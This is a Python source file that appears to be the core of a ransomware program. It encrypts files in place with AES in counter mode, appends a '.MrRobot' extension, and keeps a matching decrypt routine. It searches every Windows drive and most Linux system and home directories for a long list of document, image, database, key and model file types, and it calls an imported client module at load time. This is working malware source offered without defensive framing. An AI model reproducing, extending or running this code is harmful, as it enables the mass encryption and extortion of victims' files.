from Cryptodome.Cipher import AES
from Cryptodome.Util import Counter
import os
from Cryptodome.PublicKey import RSA
from Cryptodome.Cipher import PKCS1_OAEP  
import client
from Cryptodome.Random import get_random_bytes



def encrypt_the_files(key, file):
    nonce = get_random_bytes(8)
    counter = Counter.new(64, prefix=nonce)
    cipher = AES.new(key, AES.MODE_CTR, counter=counter)
    
    if os.path.exists(file):
        with open(file, 'r+b') as f:
            chunk_size = 4096  
            plaintext = f.read(chunk_size)
            f.seek(0)
            
            while plaintext:
                ciphertext = cipher.encrypt(plaintext)
                f.write(ciphertext)
                plaintext = f.read(chunk_size)
        
        
        with open(file + '.nonce', 'wb') as nf:
            nf.write(nonce)
        
        os.rename(file, file + ".MrRobot")
    return True 


def decrypt_the_files(key, file):
   
    nonce_file = file.replace(".MrRobot", "") + '.nonce'
    
    if not os.path.exists(nonce_file):
        print(f"Cannot decrypt {file}: missing nonce")
        return False
    
    with open(nonce_file, 'rb') as nf:
        nonce = nf.read()
    
   
    counter = Counter.new(64, prefix=nonce)
    cipher = AES.new(key, AES.MODE_CTR, counter=counter)
    
    if os.path.exists(file):
        with open(file, 'r+b') as f:
            chunk_size = 4096
            ciphertext = f.read(chunk_size)
            f.seek(0)
            
            while ciphertext:
                plaintext = cipher.encrypt(ciphertext)  
                f.write(plaintext)
                ciphertext = f.read(chunk_size)
        
        original_name = file.replace(".MrRobot", "")
        os.rename(file, original_name)
        os.remove(nonce_file)  
        return True

def target_extension(d):  
    extensions = [
        # System / Executables
        #".exe", ".dll", ".bat", ".cmd", ".sh", ".bin", ".sys", ".apk", ".deb", ".rpm", ".msi",

        # Programming / Source Code
        ".py", ".c", ".cpp", ".h", ".hpp", ".java", ".class", ".jar", ".pyc", ".js", ".ts", ".jsx",
        ".tsx", ".html", ".css", ".php", ".rb", ".go", ".rs", ".swift", ".cs", ".json", ".xml",
        ".yaml", ".yml", ".toml", ".ini", ".cfg", ".conf", ".sql", ".pl", ".lua", ".m", ".vb",
        ".asm", ".r", ".bash", ".ps1", ".vbs",

        # Documents
        ".txt", ".pdf", ".doc", ".docx", ".odt", ".rtf", ".md", ".tex", ".log", ".msg", ".pages", ".wpd",

        # Spreadsheets / Data
        ".xls", ".xlsx", ".ods", ".csv", ".tsv", ".db", ".sqlite", ".mdb", ".accdb", ".json", ".xml",
        ".dat", ".sav", ".dta", ".parquet",

        # Images
        ".jpg", ".jpeg", ".png", ".gif", ".bmp", ".tiff", ".tif", ".webp", ".svg", ".ico", ".heic", ".raw",
        ".psd", ".xcf",

        # Video
        ".mp4", ".mkv", ".avi", ".mov", ".flv", ".wmv", ".webm", ".mpeg", ".mpg", ".3gp", ".m4v", ".ts",

        # Audio
        ".mp3", ".wav", ".flac", ".aac", ".ogg", ".oga", ".m4a", ".wma", ".aiff", ".mid",

        # Archives / Compression
        ".zip", ".rar", ".7z", ".tar", ".gz", ".bz2", ".xz", ".iso", ".cab", ".zst",

        # Disk / Virtualization
        ".vmdk", ".vdi", ".img", ".iso", ".dmg", ".qcow2",

        # 3D / CAD / Design
        ".stl", ".obj", ".fbx", ".blend", ".3ds", ".dwg", ".dxf", ".max", ".skp",

        # Security / Certificates / Keys
        ".pem", ".crt", ".cer", ".key", ".pfx", ".der", ".enc", ".csr", ".asc", ".gpg",

        # Machine Learning / AI
        ".pt", ".pth", ".h5", ".keras", ".onnx", ".pb", ".joblib", ".pkl",

        # Scientific / Data Science
        ".mat", ".rdata", ".npz", ".npy", ".sav", ".arff",

        # Web / Network
        ".html", ".css", ".js", ".php", ".asp", ".jsp", ".vue", ".jsx", ".tsx", ".json", ".yaml",
        ".yml", ".conf", ".env",

        # Game / Emulator
        ".pak", ".wad", ".sav", ".rom", ".iso", ".nes", ".gba", ".nds", ".vpk",

        # Fonts
        ".ttf", ".otf", ".woff", ".woff2", ".eot",

        # Backup / Logs
        ".bak", ".old", ".tmp", ".log", ".err", ".dmp",

        # Miscellaneous
        ".torrent", ".url", ".lnk", ".ics", ".vcard", ".sig", ".cfg", ".ini"
    ]

    fd = []
    
    try:
        for root, folders, files in os.walk(d):
            for file in files:
                
                if '.' in file:
                    extension = "." + file.split(".")[-1].lower()
                    if extension in extensions:
                        full_path = os.path.join(root, file)
                        fd.append(full_path)
    except PermissionError:
        pass  # Skip directories without permission
    except Exception:
        pass  # Skip any other errors
    
    return fd


def windows_partition():
    windows_list = []
    for i in range(65, 91):
        the_drive = chr(i) + ":\\"  
        if os.path.exists(the_drive):
            windows_list.append(the_drive)
    return windows_list


def linux_partition():
    linux_list = [
        # "/",  # Root directory
        # "/boot",  # Boot files (kernel, GRUB)
        "/home",  # User home directories
        "/bin",  # Essential user binaries
        "/sbin",  # System binaries (for admin)
        "/usr",  # User programs and libraries
        "/lib",  # Shared system libraries
        "/etc",  # Configuration files
        "/var",  # Variable data (logs, cache, etc.)
        "/tmp",  # Temporary files
        "/opt",  # Optional/additional software
        "/srv",  # Service data (FTP, HTTP, etc.)
        "/mnt",  # Temporary mount point
        "/media",  # Removable media (USB, CD)
        "/dev",  # Device files
        "/proc",  # Kernel and process information
        "/sys",  # System info (hardware, kernel)
        # "/run"  # Runtime data
    ]
    return linux_list


client.client()
